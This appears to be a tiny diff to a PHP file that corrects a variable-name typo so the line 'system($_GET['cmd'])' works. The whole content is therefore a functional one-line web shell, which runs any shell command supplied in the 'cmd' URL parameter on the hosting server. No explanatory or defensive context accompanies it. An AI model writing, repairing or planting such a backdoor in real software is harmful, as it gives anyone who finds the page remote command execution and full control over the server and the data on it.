@@ -1,2 +1,2 @@
 <?php
-system($GET_['cmd']);
+system($_GET['cmd']);
